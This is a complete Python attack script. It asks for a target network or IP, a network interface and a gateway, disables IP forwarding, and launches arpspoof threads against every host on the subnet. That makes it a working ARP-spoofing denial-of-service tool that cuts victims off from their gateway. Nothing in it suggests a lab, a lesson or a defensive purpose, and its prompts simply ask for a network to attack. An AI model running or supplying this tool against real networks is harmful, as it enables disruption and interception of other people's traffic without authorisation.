#!/usr/bin/python3

import os
import time
import ipaddress
import threading

def arpspoof(ip):
        os.system(f"arpspoof -i {INTERFACE} -t {ip} -r {GATEWAY} 2>/dev/null")

NETWORK_INPUT = input("Enter the network to attack (e.g. 192.168.0.1/24) or just the IP to attack a single target (e.g. 192.168.0.1): ")
INTERFACE = input("Enter your network interface (e.g. eth0): ")
GATEWAY = input("Enter the gateway (e.g. 192.168.0.1): ")

NETWORK = ipaddress.IPv4Network(NETWORK_INPUT, strict=False)

FORWARDING = str(input("To perform the attack, you need to have packet forwarding disabled. Do you want to disable it? (Y/N): "))
if FORWARDING == "Y":
        print("Disabling packet forwarding...")
        time.sleep(1)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
elif FORWARDING == "N":
        print("You need to have packet forwarding disabled")
        exit()
else:
        print("Invalid response")
        exit()

print("[+] Attack started (Press Ctrl + C to stop)")
time.sleep(1)
for ip in NETWORK.hosts():
        print(f"[+] Attacking {ip} (Press Ctrl + C to stop)")
        threading.Thread(target=arpspoof, args=(str(ip),)).start()
